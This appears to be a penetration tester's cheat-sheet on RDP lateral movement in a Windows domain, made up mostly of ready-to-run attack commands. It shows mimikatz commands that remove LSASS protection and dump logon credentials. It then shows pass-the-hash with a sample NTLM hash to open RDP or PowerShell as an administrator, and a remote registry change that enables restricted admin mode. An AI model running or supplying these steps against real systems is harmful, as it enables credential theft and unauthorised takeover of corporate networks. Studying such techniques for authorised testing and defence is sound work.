RDP is a multichannel network protocol developed by Microsoft and is used for communication
between Terminal Servers and their clients. When an RDP connection is created, the NTLM hashes will reside in memory for the duration of
the session. The session does not terminate without a proper logout, which means simply
disconnecting from the sessions will leave the hashes in memory.We can dump the hash if we find a RDP jump server.

```
mimikatz # privilege::debug
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # sekurlsa::logonpasswords
```

We can also use /restrictedadmin argument to mstsc.exe, so we don't need to supply clear text password to RDP

pass the hassh, and lauch a mstsc.exe with admin's hash
```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /user:admin /domain:corp1
/ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"
```
In the case that restrictedadmin is disable on target machine, we can enable it first.

lanuch an admin powershell
```
mimikatz # sekurlsa::pth /user:admin /domain:corp1
/ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell
```
Access to remote resource through a powershell session and enable the restrictedadmin mode
```
PS C:\Windows\system32> Enter-PSSession -Computer appsrv01

[appsrv01]: PS C:\Users\admin\Documents> New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0
```
